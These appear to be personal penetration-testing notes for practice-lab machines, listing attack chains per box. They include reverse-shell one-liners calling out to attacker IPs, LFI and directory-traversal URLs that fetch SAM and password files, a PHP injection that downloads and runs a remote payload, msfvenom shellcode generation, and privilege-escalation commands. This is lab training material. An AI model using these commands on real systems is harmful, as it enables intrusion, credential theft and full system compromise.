## Paths to Victory

1. Unusual nmap ftp output
2. Retrieve file with hash
3. Use credentials to connect to admin interface on website
4. Upload netcat.exe, then php file including system('netcat.exe -vv 192.168.4.178 443 -e cmd.exe'); that triggers netcat.exe to get a shell
5. Upload jsp shell file to web app that's running as admin in folder exposed to internet
sc config servicename binPath= "C:\Path\To\New\Service.exe"

1. Find version through network developers tool section where it's retrieving/using a js file
2. There are various exploits and vulnerabilities, and it ends up being one that was newer than the version

1. Website vulnerable to directory traversal and LFI, found through search
2. Retrieve/wget old SAM and SYSTEM files located in "http://192.168.33.165/..%5C..%5C..%5C..%5C..%5Cwindows..%5Csystem..%5Cconfig..%5Cregback..%5Csystem.old"
3. Pwdump to get hashes
4. Login to RDP

1. Few ports open on linux, 22, 80, 389 & 443
2. Find exploit for the nagios webapp from a niche security blog
3. Get www-data user, and use the same exploit to escalate privs to root

1. FreeSWITCH is running as webapp
2. Find RCE exploit, test that it's working
3. Upload nc.exe with PowerShell with exploit
4. Trigger nc.exe with exploit
5. Machine has vulnerable service path
6. Rename existing service
7. Upload/rename rev binary to path folder
8. Reboot machine

1. Find admin interface on Blogengine.net webapp
2. User/pass is Admin:Admin found with hydra brute force
3. Find exploit
4. Rename exploit to PostView.ascx and get webshell
5. iwr command for normal shell
6. Exploit SeCreateTokenPrivilege with file from https://www.greyhathacker.net/?p=1025 and run maybe 20 times
1. Three separate webapps,api,login with many rabbit holes, buggy ftp with anon access, smb, etc.

1. Bunch of web service with an api
2. CSRF via one of the apis, tested with curl (deep rabbit hole with ruby webapp login and routes)
3. Execute nc revshell on same port as api
4. With sudo -l /sbin/reboot, and modifiable /etc/systemd/system/pythonapp.service, changed file User param to root and rebooted
5. Same api nc command, but as root this time

1. Struggling smb session, wonky website, Windows workgroup for linux website, all distract from vulnerable SMTP version
2. ExploitDB exploits work enough to ping but nothing else
3. Go on github and try a few until one works

1. Weird ssh port, taunting website with nothing to show, smtp and snmp open
2. Snmp show clamav running in blackhole mode
3. Go exploit works from github, only with bindshell

1. Dir brute until reach download.php
2. LFI in download.php?path=../../../../../../../xampp/security/webdav.htpasswd
3. Crack hash
4. Upload netcat, "curl --user 'wampp:password' -T nc.exe http://targetip/webdev/nc.exe"
5. Upload php command shell
6. Trigger netcat, 'http://targetip/webdav/cmd.php?cmd=nc+-e+cmd.exe+$myip+53'
7. Vulnerable webdav version

1. Vulnerable webapp version
2. Generate shellcode, 'msfvenom -a x86 --platform windows -p windows/shell_bind_tcp LHOST=192.168.45.178 LPORT=80 -f py -b '\x00\x02\x0a\x0d\xf8\xfd' --var-name shellcode'
3. Get root shell

1. Hidden directory in robots.txt
2. KikChat is vulnerable
3. Test and get more info, 'curl -s http://targetip/23423/rooms/get.php\?name=info.php\&ROOM\="<?php phpinfo()+?>"'
4. See that allow_url_fopen and allow_url_include are On
5. Upload bat file to target machine, 'curl -s http://targetip/23423/rooms/get.php\?name=info.php\&ROOM\="<?php+file_put_contents('nc.bat',file_get_contents('http://$myip/nc.txt'));system('nc.bat');usleep(2000000);system('nc.exe+-nv+$targetip+1234+-cmd+cmd.exe');+?>"
6. Once on the machine, replace process with revshell

1. Password in register source code, email on admin forum post
2. Hidden/commented out field in systeminfo source code, '<input type="text" name="cmd" readonly=""> <input type="submit" >''
3. Hidden authenticity_token in source code
4. Create new node in html with it not commented out and submit revshell command
5. base32 encoded ssh key in .bashrc file
6. Missing '-' in ssh keys, ssh in as root

1. SQL injection to webshell on another open ssh, quotation "cmd" was everything
2. Find file that was shared with root for root mysql pass
3. Exploit MySql 5.7 by creating do_system plugin
4. Execute revshell

1. Download ftp files, open with wireshark and get password
2. Notice that there's a hidden directory (/data), which has weird behavior
3. See that it's decoding base64 for LFI
4. Get all components for Werkzeug pin exploit
5. Revshell through console
6. Find commented out password in source files once in machine, su jack
7. History file root pwd

1. Lots of web surface, rabbit holes for directory with binaries, db that you can log into but nothing works, multiple .git repositories, lots of vuln software, ..., there's a directory that's not in raft-large-dir..
2. In the source code of forgot.php there's a hint about implementing sendmail.php and fixing input validation
3. Identify command injection, email=+||id (in the url), then get nc rev shell
4. Find user's password in /var/backups/file.bak
5. Sudo privileges with git, and ur root

1. Everything seemed to be pointing towards webapp exploit, tons of bait, but the postgres version had an exploit
2. Run python exploit and land as root

1. Exposed api
2. WAF was blocking calls to /logs
3. Add header 'X-Forwarded-For: localhost' to bypass unicorn 20.0.4
4. Grab username from /etc/passwd
5. Auth with username for another api call that grabs website, command injection for nc reverse shell'; nc ...'
6. Noticed that I couldn't make any files I wget'd executable, wget has suid set
7. Slightly modify gtfo bins command to call wget directly

1. Vulnerable webapp, log in ad admin:admin
2. Upload revshell as .phtml
3. Old machine, plenty of bites, can't run executables, hashes in sql wont crack, readable root directory with .cap
4. Try to su as patrick with password found in .cap, doesn't work but patrick as password does
5. Sudo -i

1. Not much open, no ftp anon, hash wont crack from exiftool, postgres:postgres login
2. Misleading payroll stuff in history, revshell with postgres
3. Root with find suid

1. Vulnerable webapp
2. Personalize 2nd exploit, get shell
3. Lot of dead ends, cant execute binaries, but gcc on box
4. Dirtycow didn't work, but rds one did (transferred), dont know why it ran

1. Smb on crazy port, weird api and a few webapps, one being wpscan
2. Vulnerable plugin (simple-file-list), all exploits had this weird post password thing that I swapped with a simple php cmd shell
3. Shell as http with echo encoded bash reverse command, lots of weird desktop, vnc stuff
4. Suid for dosbox that let me write to /etc/sudoers, `dosbox -c 'mount c /' -c "echo http ALL=(root) NOPASSWD:ALL >C:$LFILE" -c exit`
5. Run bash to get root

1. Big mail thing, lots of mail ports, team introduced on website
2. Scrape their names, as well as sales and legal, and vrfy emails
3. Test sales:sales and read email, 'curl -k 'imaps://postfish.offsec/INBOX;MAILINDEX=1' --user sales:sales'
4. Send email to brian with link to 'nc -lvp 80' and get his password
5. Ssh in and run around a million circles, see that you can edit /etc/postfix/disclaimer which is triggered whenever an email is sent
6. Put backdoor in disclaimer, then send email to get shell as filter
7. Sudo privesc with mail binary

1. Billion exploit for webapp, turns out a filemanager exploit was way to go
2. Manually type exploit into url to get it working
3. Search through github source code to find sqlconf.php as good file to uncover
4. Copy file into smb directory to read
5. Login to mysql through mycli to bypass ssl issues
6. Crack password
7. Login to webapp, exploit rce vuln (modify code a bit for path)
8. Escalate to root with mysql password

1. Weird htlmy php website, redis, ftp, postgres exploit would kinda work (ping back but nothing else)
2. Brute force ftp user/pass
3. Upload compiled module.so and run redis-cli and load from /var/ftp/pub/module.so, execute revshell
4. Weird mailer stuff, path that i could write to for .so files, lotta suids, centos7, vulnerable mailer exploit for sudo 1.8.23
5. Run exploit and get revshell (https://github.com/worawit/CVE-2021-3156)

1. Fuzz api endpoint, users/passwords spill out when i did $url/api/users;
2. Ssh in and uncover git repo in root, cronjob that fetching remote changes and runs them
3. Find the rights commands to push revshell and get root

1. Find hint for subdomain in page source, now i know to look for comments, hrefs, and src when doing that
2. Survey webapp has exploit, get shell
3. Password deep in web directories
4. Could sudo -l thing a shell script in /usr/bin, but as another user, not root
5. Work some magic to bypass restriction, cat hidden files in his directories that held his pwds
6. Sudo -i to root

1. Exploits for gitea and proftpd, gitea exploit would work, but something weird happening with git config
2. Manually create an account on gitea, make new directory, modify git hooks to run reverse shell, clone repo, add, commit, and push to trigger
3. Writable /usr/local/sbin where I could place shell3000 as run-parts and get reverse shell as root

1. Bunch of webapps open, barracudaserver lets you configure admin, traverse through gui to another webroot
2. Place bens_shell.php and trigger revshell
3. Replace bd.exe (barracuda executable) with revshell to get nt authority

1. Face Jetty webapp, another webapp both with a ton of vulns, but none work
2. Many of the exploits assume you're authenticated, so brute force login with cewl
3. Run exploit with encoded powershell to get on the box
4. Plant reverse shell in webroot and move laterally
5. Exploit seimpersonate with GodPotatoNet4, bolded 4, as other versions did not work, with nc.exe revshell to get nt authority

1. Email on front page, uploading resume, only takes odt files
2. Craft simple odt with macro-generator.py and get revshell
3. Plant revshell in webroot to move laterally
4. Spooler is running and you have Impersonate, simple nc revshell command with PrintSpooler to get nt authority

1. Odt that reaches out to server to grab ntlm (bad-odt.py), placed revshell in webroot to get in as apache
2. MySQL running locally with phpmyadmin, chisel website so that I can execute commands
3. Test db executes commands as admin, so WerTrigger is in the ballgame
4. Transfer WerTrigger binaries through smb (phone dll is msfvenom revshell)
5. Move binaries to system32 directory (for the exploit to work) with mysql (select load_file('') into dumpfile '';
6. Cd into system32 and run WerTrigger.exe and receive revshell as nt authority

impacket-GetADUsers with bruteforced passwd with custom list (cewl & oscp.rule)
getNPUusers and crack svc_mssql hash
passwordspray asrep pass from svc_mssql and get svc_web (useless)
run bloodhound-python
use bloodyad to set new password for iain
use bloodyad to set new password for christopher (using iain creds)
Summer2023

Enum smtp users
Try username as passwords for ftp
Find mysql password in config.php
Check version and see that it's 5.x
Do the library file exploit to get admin

fuzz directories and find bugtracker, fuzz more and get /bugtracker/admin
read install.php, read docs as to why admin shouldn't be accessible
copy devs poc and leak sql pass
- LOGIN TO MYSQL W ^^ CREDS
- CRACK USER PASS FROM TABLE
change configuration that enables command injection (again from the devs lmao)
catch rev
see password in pspy cronjob process
use password with su mantis
sudo -i

- find recent cve for mlflow
- use github poc and get users from passwd
- read id_rsa and ssh in
- sudo -l -> can any file to any location
- transfer over passwd with custom root user, download/transfer to /etc/passwd
- root

brute force login in /Admin/ (Couldve sql bypass)
uncover password in cme
upload png (php reverse shell), intercept and change name to rev.php
use found password to pivot
chisel local web server and see jenkins running
search version and find file disclosure vuln
disclose /root/.../initial-pass or something with that name
login and go to /script, launch rev shell
root